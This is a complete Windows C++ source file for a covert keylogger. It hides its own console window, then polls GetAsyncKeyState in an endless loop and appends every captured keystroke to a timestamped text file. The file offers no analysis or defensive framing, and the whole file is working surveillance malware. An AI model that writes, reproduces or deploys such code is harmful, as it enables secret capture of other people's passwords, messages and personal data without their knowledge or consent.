#ifdef _MSC_VER
#define _CRT_SECURE_NO_WARNINGS
#endif

#include <algorithm>
#include <iostream>
#include <fstream>
#include <windows.h>
#include <chrono>
#include <ctime>  

#include <conio.h>
namespace {
	std::ofstream of;
}

std::string getFileName() {
	// obtain filename for the logfile
	auto end = std::chrono::system_clock::now();
	std::time_t end_time = std::chrono::system_clock::to_time_t(end);
	std::string file_name = std::ctime(&end_time);

	// remove new line char from end of file_name
	file_name = file_name.substr(0, file_name.size() - 1);
	// remove all spaces from the filename
	std::remove(file_name.begin(), file_name.end(), ' ');
	std::remove(file_name.begin(), file_name.end(), ':');
	file_name += ".txt";
	return file_name;
}

void hideConsole() {
	AllocConsole();
	HWND console = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(console, SW_HIDE);
}

int main() {
	hideConsole();

	// open file for writing
	auto file_name = getFileName();
	of.open(file_name.c_str(), std::ofstream::out | std::ofstream::app);
	if (!of) {
		std::cerr << "can't open output file" << std::endl;
	}
	 
	// recording keystrokes
	while (1) {
		for (char i = 0; i < 127; i++) {
			if (GetAsyncKeyState(i) == -32767) {
				of << i;
				of.flush();
			}
		}
	}
	return 0;
}
